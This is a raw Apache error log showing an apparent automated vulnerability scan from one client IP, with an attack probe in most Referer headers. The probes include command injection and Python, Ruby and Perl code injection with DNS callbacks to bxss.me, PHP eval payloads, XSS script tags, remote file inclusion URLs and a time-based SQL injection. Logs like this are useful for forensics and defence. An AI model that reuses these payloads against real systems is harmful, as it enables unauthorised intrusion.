[Wed Jul 07 23:55:16.635008 2021] [autoindex:error] [pid 23443] [client 27.147.202.214:13803] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ;(nslookup hitynslyuhcfjf5eb5.bxss.me||perl -e "gethostbyname('hitynslyuhcfjf5eb5.bxss.me')")|(nslookup hitynslyuhcfjf5eb5.bxss.me||perl -e "gethostbyname('hitynslyuhcfjf5eb5.bxss.me')")&(nslookup hitynslyuhcfjf5eb5.bxss.me||perl -e "gethostbyname('hitynslyuhcfjf5eb5.bxss.me')")
[Wed Jul 07 23:55:16.702332 2021] [autoindex:error] [pid 23710] [client 27.147.202.214:13800] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
[Wed Jul 07 23:55:16.835855 2021] [autoindex:error] [pid 23729] [client 27.147.202.214:13836] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:16.872818 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitcjbubdaeny587c1.'+'bxss.me')
[Wed Jul 07 23:55:16.903683 2021] [autoindex:error] [pid 23717] [client 27.147.202.214:13809] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: HttP://bxss.me/t/xss.html?%00
[Wed Jul 07 23:55:17.010132 2021] [autoindex:error] [pid 23715] [client 27.147.202.214:13806] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ';print(md5(31337));$a='
[Wed Jul 07 23:55:17.089108 2021] [autoindex:error] [pid 23726] [client 27.147.202.214:13832] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: "+"A".concat(70-3).concat(22*4).concat(103).concat(77).concat(100).concat(78)+(require"socket" Socket.gethostbyname("hituh"+"dvetxfchc5afc.bxss.me.")[3].to_s)+"
[Wed Jul 07 23:55:17.095559 2021] [autoindex:error] [pid 23719] [client 27.147.202.214:13814] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: http://hitmzetmftern.bxss.me/
[Wed Jul 07 23:55:17.115528 2021] [autoindex:error] [pid 23722] [client 27.147.202.214:13824] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: )))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
[Wed Jul 07 23:55:17.191253 2021] [autoindex:error] [pid 23711] [client 27.147.202.214:13802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ".gethostbyname(lc("hitgj"."gzxusrhl68f6e.bxss.me."))."A".chr(67).chr(hex("58")).chr(109).chr(66).chr(109).chr(84)."
[Wed Jul 07 23:55:17.191264 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitcjbubdaeny587c1."+"bxss.me")+'
[Wed Jul 07 23:55:17.217911 2021] [autoindex:error] [pid 23714] [client 27.147.202.214:13801] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '"
[Wed Jul 07 23:55:17.219563 2021] [autoindex:error] [pid 23721] [client 27.147.202.214:13827] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ^(#$!@#$)(()))******
[Wed Jul 07 23:55:17.230649 2021] [autoindex:error] [pid 23717] [client 27.147.202.214:13809] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: bxss.me/t/xss.html?%00
[Wed Jul 07 23:55:17.236834 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: Http://bxss.me/t/fit.txt
[Wed Jul 07 23:55:17.319494 2021] [autoindex:error] [pid 23710] [client 27.147.202.214:13800] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.326740 2021] [autoindex:error] [pid 23715] [client 27.147.202.214:13806] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ";print(md5(31337));$a="
[Wed Jul 07 23:55:17.395076 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing'"()&%<acx><ScRiPt >iSqj(9816)</ScRiPt>
[Wed Jul 07 23:55:17.437667 2021] [autoindex:error] [pid 23726] [client 27.147.202.214:13832] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.514365 2021] [autoindex:error] [pid 23722] [client 27.147.202.214:13824] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: "+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitcjbubdaeny587c1.'+'bxss.me')+"
[Wed Jul 07 23:55:17.569031 2021] [autoindex:error] [pid 23719] [client 27.147.202.214:13814] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.570711 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: http://bxss.me/t/fit.txt%3F.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.641371 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.645203 2021] [autoindex:error] [pid 23717] [client 27.147.202.214:13809] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ${@print(md5(31337))}
[Wed Jul 07 23:55:17.720160 2021] [autoindex:error] [pid 23715] [client 27.147.202.214:13806] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '"()&%<acx><ScRiPt >iSqj(9702)</ScRiPt>
[Wed Jul 07 23:55:17.726860 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '+'A'.concat(70-3).concat(22*4).concat(100).concat(89).concat(107).concat(77)+(require'socket' Socket.gethostbyname('hitnu'+'exlbdrvf12785.bxss.me.')[3].to_s)+'
[Wed Jul 07 23:55:17.733596 2021] [autoindex:error] [pid 23711] [client 27.147.202.214:13802] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.761949 2021] [autoindex:error] [pid 23726] [client 27.147.202.214:13832] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.837379 2021] [autoindex:error] [pid 23710] [client 27.147.202.214:13800] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.901843 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: bxss.me
[Wed Jul 07 23:55:17.908044 2021] [autoindex:error] [pid 23719] [client 27.147.202.214:13814] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.964453 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:17.975568 2021] [autoindex:error] [pid 23717] [client 27.147.202.214:13809] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: ${@print(md5(31337))}\\
[Wed Jul 07 23:55:18.036502 2021] [autoindex:error] [pid 23715] [client 27.147.202.214:13806] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing9244861
[Wed Jul 07 23:55:18.062974 2021] [autoindex:error] [pid 23721] [client 27.147.202.214:13827] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.085160 2021] [autoindex:error] [pid 23726] [client 27.147.202.214:13832] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 1tgyz9q2O
[Wed Jul 07 23:55:18.095812 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: <!--
[Wed Jul 07 23:55:18.231000 2021] [autoindex:error] [pid 23729] [client 27.147.202.214:13836] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.240415 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.285908 2021] [autoindex:error] [pid 23718] [client 27.147.202.214:13813] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.304130 2021] [autoindex:error] [pid 23720] [client 27.147.202.214:13826] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: '.print(md5(31337)).'
[Wed Jul 07 23:55:18.363362 2021] [autoindex:error] [pid 23717] [client 27.147.202.214:13809] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.408423 2021] [autoindex:error] [pid 23726] [client 27.147.202.214:13832] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.416538 2021] [autoindex:error] [pid 23443] [client 27.147.202.214:13803] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.418357 2021] [autoindex:error] [pid 23722] [client 27.147.202.214:13824] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.418722 2021] [autoindex:error] [pid 23716] [client 27.147.202.214:13804] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.551968 2021] [autoindex:error] [pid 23729] [client 27.147.202.214:13836] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.565296 2021] [autoindex:error] [pid 23707] [client 27.147.202.214:13811] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.574802 2021] [autoindex:error] [pid 23725] [client 27.147.202.214:13833] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://www.google.com/search?hl=en&q=testing
[Wed Jul 07 23:55:18.589849 2021] [autoindex:error] [pid 23731] [client 27.147.202.214:13808] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: 0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
